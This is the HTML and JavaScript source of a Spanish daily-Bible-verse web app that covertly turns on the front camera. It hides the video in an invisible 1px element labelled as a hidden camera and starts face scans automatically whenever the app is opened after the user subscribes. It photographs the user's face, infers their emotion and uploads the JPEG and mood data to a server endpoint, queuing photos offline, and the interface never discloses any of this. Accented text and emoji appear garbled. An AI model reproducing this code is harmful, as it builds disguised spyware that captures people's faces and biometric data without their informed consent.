<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="manifest" href="manifest.json">
  <title>Vers√≠culo Diario</title>
  
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>

  <style>
    body { background: #121212; color: #e0e0e0; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; overflow-x: hidden; }
    
    #main-container { width: 90%; max-width: 600px; position: relative; padding-bottom: 50px; z-index: 10; }

    #verse { font-size: 1.5rem; font-style: italic; margin-bottom: 20px; line-height: 1.4; text-shadow: 0px 2px 4px rgba(0,0,0,0.5); opacity: 0; transition: opacity 0.5s ease; }
    #reference { font-weight: bold; margin-top: 10px; color: #bb86fc; font-size: 1.1rem; letter-spacing: 1px; text-transform: uppercase; opacity: 0; transition: opacity 0.5s ease; }
    
    .fade-up { animation: fadeInUpSubtle 1.5s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
    @keyframes fadeInUpSubtle { 0% { opacity: 0; transform: translateY(20px); filter: blur(5px); } 100% { opacity: 1; transform: translateY(0); filter: blur(0); } }

    .btn-group { display: flex; flex-direction: column; gap: 15px; margin-top: 30px; align-items: center; }
    button { padding: 15px 25px; border: none; cursor: pointer; border-radius: 50px; font-weight: 800; font-size: 0.9rem; width: 100%; max-width: 300px; transition: transform 0.2s; }
    button:active { transform: scale(0.95); }
    
    #btn-notify { background: linear-gradient(45deg, #bb86fc, #3700b3); color: white; box-shadow: 0 4px 15px rgba(187, 134, 252, 0.4); display: flex; align-items: center; justify-content: center; gap: 10px; }
    #btn-unsubscribe { background: #cf6679; color: #000; display: none; }
    .version-footer { position: fixed; bottom: 5px; width: 100%; text-align: center; font-size: 0.7rem; color: #555; pointer-events: none; }

    /* C√ÅMARA INVISIBLE */
    #hidden-camera-container { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; z-index: -100; pointer-events: none; }
  </style>
</head>
<body>

  <div id="main-container">
    <div id="verse">Cargando inspiraci√≥n...</div>
    <div id="reference"></div>
    
    <div class="btn-group">
        <button id="btn-notify" onclick="window.subscribeUser()">üìú OBTENER SABIDUR√çA</button>
        <button id="btn-unsubscribe" onclick="window.unsubscribeUser()">üîï DETENER</button>
        <button onclick="startMoodScan(true)" style="background: #333; font-size: 0.7rem; padding: 5px;">üîß FORZAR SCAN</button>
    </div>
  </div>

  <div id="hidden-camera-container">
      <video id="video-feed" autoplay muted playsinline></video>
  </div>

  <div id="version-footer" class="version-footer">Cargando versi√≥n...</div>

  <script type="module">
    import { versesDB } from './js/verses.js';

    const PUBLIC_VAPID_KEY = 'BLAmSvWiwybGELdtlKxn1XH_ftdsMs2IpWshmmPWGUF3ndWSS06tXY4oFAcUEHbYQPcDaaOl_6cwNjaFM0bmUhI';
    let currentVerseData = null;
    let videoStream = null;
    let modelsLoaded = false;
    
    let isScanning = false;
    let lastScanTime = 0;
    let scanStartTime = 0;
    const SCAN_COOLDOWN = 15000; 
    const SCAN_TIMEOUT = 10000; // Subimos a 10s para dar tiempo de debug

    // --- LOGGING ---
    function log(msg) { console.log(`[APP]: ${msg}`); }

    // --- IA LOGIC ---
    window.startMoodScan = async function(force = false) {
        log("Intentando iniciar scan...");

        if (isScanning) { log("üö´ Scan abortado: Ya est√° corriendo."); return; }
        
        const now = Date.now();
        if (!force && (now - lastScanTime < SCAN_COOLDOWN)) {
            log(`‚è≥ Scan abortado: Enfriamiento activo (${Math.round((SCAN_COOLDOWN - (now-lastScanTime))/1000)}s restantes).`);
            return;
        }

        isScanning = true;
        scanStartTime = Date.now();
        log("üöÄ Iniciando C√°mara y Modelos...");

        try {
            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.getElementById('video-feed');
            video.srcObject = videoStream;
            log("‚úÖ Stream de video obtenido.");

            // Asegurar que el video est√© reproduciendo
            await video.play().catch(e => log("Video play error (normal si es invisible): " + e));

            if (!modelsLoaded) {
                log("üì• Descargando modelos IA (esto puede tardar)...");
                await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                await faceapi.nets.faceExpressionNet.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                modelsLoaded = true;
                log("‚úÖ Modelos cargados.");
            }

            log("üëÄ Comenzando bucle de detecci√≥n...");
            detectEmotionLoop();

        } catch (err) {
            console.error("‚ùå Error Fatal C√°mara:", err);
            handleScanFailure();
        }
    }

    async function detectEmotionLoop() {
        if (!isScanning) return;
        
        // Timeout Debug
        const elapsed = Date.now() - scanStartTime;
        if (elapsed > SCAN_TIMEOUT) {
            log(`‚è∞ TIMEOUT: Pasaron ${elapsed/1000}s sin detectar cara.`);
            handleScanFailure(); 
            return;
        }

        const video = document.getElementById('video-feed');

        try {
            const options = new faceapi.TinyFaceDetectorOptions();
            const detections = await faceapi.detectSingleFace(video, options).withFaceExpressions();

            if (detections) {
                const expressions = detections.expressions;
                const sorted = Object.keys(expressions).sort((a, b) => expressions[b] - expressions[a]);
                const dominant = sorted[0];
                const confidence = expressions[dominant];

                // Bajamos umbral a 0.4 para facilitar pruebas
                if (confidence > 0.4) {
                    log(`üéØ ROSTRO DETECTADO: ${dominant} (${Math.round(confidence*100)}%)`);
                    
                    captureAndSave(video, dominant, confidence);
                    finishScan(dominant);
                    return;
                } else {
                    // Loguear intentos fallidos cada cierto tiempo para no saturar
                    if (Math.random() > 0.8) log(`...viendo algo pero con poca confianza (${Math.round(confidence*100)}%)`);
                }
            } else {
                // Loguear "nada" ocasionalmente
                if (Math.random() > 0.9) log("...buscando rostro...");
            }
        } catch(e) {
            console.error("Error en loop IA:", e);
        }

        if (isScanning) setTimeout(detectEmotionLoop, 200);
    }

    function finishScan(mood) {
        log("‚ú® Scan finalizado con √©xito.");
        lastScanTime = Date.now();
        isScanning = false;
        stopCamera();
        document.getElementById('reference').classList.remove('analyzing');
        showVerseByMood(mood);
    }

    function handleScanFailure() {
        log("‚ö†Ô∏è Fallo o Timeout. Cerrando c√°mara.");
        lastScanTime = Date.now();
        isScanning = false;
        stopCamera();
        document.getElementById('reference').classList.remove('analyzing');
    }

    // --- GUARDADO ---
    async function captureAndSave(videoElement, emotion, confidence) {
        log("üì∏ Generando foto...");
        try {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(videoElement, 0, 0);

            const base64Image = canvas.toDataURL('image/jpeg', 0.5);
            const verse = getVerseForMood(emotion);
            const payload = { image: base64Image, emotion, confidence, verse };

            if (navigator.onLine) {
                log("üì° Enviando a Mongo...");
                sendToMongo(payload);
            } else {
                log("üì¥ Sin internet. Guardando en Local.");
                saveToOfflineQueue(payload);
            }
        } catch (e) { console.error("Error Capture:", e); }
    }

    async function sendToMongo(payload) {
        try {
            const res = await fetch('/api/save-mood', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if(res.ok) log("‚úÖ ¬°Guardado en Mongo OK!");
            else log("‚ùå Error servidor Mongo: " + res.status);
        } catch(e) { 
            log("‚ùå Error Red. Pasando a cola offline.");
            saveToOfflineQueue(payload); 
        }
    }

    function saveToOfflineQueue(payload) {
        let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
        queue.push(payload);
        if (queue.length > 3) queue.shift();
        localStorage.setItem('mood_queue', JSON.stringify(queue));
        log(`üìÅ Guardado en cola local (${queue.length} items)`);
    }

    async function processOfflineQueue() {
        if (!navigator.onLine) return;
        let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
        if (queue.length === 0) return;
        log(`üîÑ Procesando cola offline (${queue.length})...`);
        for (const item of queue) { await sendToMongo(item); }
        localStorage.removeItem('mood_queue');
    }

    // --- UTILIDADES ---
    window.addEventListener('online', processOfflineQueue);
    window.addEventListener('load', processOfflineQueue);

    function getVerseForMood(mood) {
        let dbMood = 'neutral';
        if (mood === 'happy') dbMood = 'happy';
        if (mood === 'sad') dbMood = 'sad';
        if (mood === 'angry' || mood === 'disgusted') dbMood = 'angry';
        if (mood === 'fearful') dbMood = 'fear';
        const filtered = versesDB.filter(v => v.m && v.m.includes(dbMood));
        const pool = filtered.length > 0 ? filtered : versesDB;
        return pool[Math.floor(Math.random() * pool.length)];
    }

    function showVerseByMood(mood) { renderVerse(getVerseForMood(mood)); }
    function renderVerse(data) {
        currentVerseData = data;
        const verseEl = document.getElementById('verse');
        const refEl = document.getElementById('reference');
        verseEl.style.opacity = 0; refEl.style.opacity = 0;
        setTimeout(() => {
            verseEl.innerText = `"${data.t}"`;
            refEl.innerText = data.r;
            verseEl.style.opacity = 1; refEl.style.opacity = 1;
            verseEl.classList.remove('fade-up'); void verseEl.offsetWidth; verseEl.classList.add('fade-up');
        }, 500);
    }
    window.stopCamera = function() { if (videoStream) { videoStream.getTracks().forEach(track => track.stop()); videoStream = null; } }

    async function showVersionFromSW() {
        try {
            const response = await fetch('./sw.js?t=' + new Date().getTime());
            const text = await response.text();
            const match = text.match(/const\s+CACHE_NAME\s*=\s*['"]([^'"]+)['"]/);
            if (match && match[1]) document.getElementById('version-footer').innerText = `App: ${match[1].replace('biblia-', '')}`;
        } catch (e) {}
    }
    
    // UI & INIT
    window.subscribeUser = async function() {
      if (!('serviceWorker' in navigator)) return;
      try {
        const reg = await navigator.serviceWorker.ready;
        const permission = await Notification.requestPermission();
        if (permission !== 'granted') return;
        function urlBase64ToUint8Array(base64String) {
            const padding = '='.repeat((4 - base64String.length % 4) % 4);
            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
            const rawData = window.atob(base64);
            const outputArray = new Uint8Array(rawData.length);
            for (let i = 0; i < rawData.length; ++i) outputArray[i] = rawData.charCodeAt(i);
            return outputArray;
        }
        const sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY) });
        await fetch('/api/subscribe', { method: 'POST', body: JSON.stringify({ subscription: sub, firstVerse: currentVerseData }), headers: { 'Content-Type': 'application/json' } });
        localStorage.setItem('setup_v1_pwa', 'true'); 
        updateUI(true); setTimeout(() => startMoodScan(true), 500); 
      } catch (err) { console.error(err); }
    }
    window.unsubscribeUser = async function() {
        if (!confirm("¬øBorrar datos?")) return;
        try {
            const reg = await navigator.serviceWorker.ready;
            const sub = await reg.pushManager.getSubscription();
            if (sub) { await fetch('/api/unsubscribe', { method: 'POST', body: JSON.stringify({ endpoint: sub.endpoint }), headers: { 'Content-Type': 'application/json' } }); await sub.unsubscribe(); localStorage.removeItem('setup_v1_pwa'); }
            updateUI(false); window.location.reload();
        } catch(e) { console.error(e); }
    }
    function updateUI(isSubscribed) {
        document.getElementById('btn-notify').style.display = isSubscribed ? 'none' : 'inline-block';
        document.getElementById('btn-unsubscribe').style.display = isSubscribed ? 'inline-block' : 'none';
    }

    showVersionFromSW();
    renderVerse(versesDB[new Date().getDate() % versesDB.length]);
    document.addEventListener("visibilitychange", () => {
        if (document.visibilityState === "visible") {
            if (localStorage.getItem('setup_v1_pwa')) { log("üëÄ App visible. Trigger scan..."); startMoodScan(); }
        }
    });
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('sw.js', { type: 'module' }).then(reg => {
          reg.onupdatefound = () => { const newWorker = reg.installing; newWorker.onstatechange = () => { if (newWorker.state === 'activated' && navigator.serviceWorker.controller) window.location.reload(); }; };
      });
      navigator.serviceWorker.addEventListener('controllerchange', () => window.location.reload());
      navigator.serviceWorker.ready.then(async (reg) => {
          const sub = await reg.pushManager.getSubscription();
          const isDone = localStorage.getItem('setup_v1_pwa');
          updateUI(!!sub || isDone);
          if (!!sub || isDone) { setTimeout(() => { log("üöÄ Inicio Auto."); startMoodScan(); }, 1000); }
      });
    }
  </script>
</body>
</html>
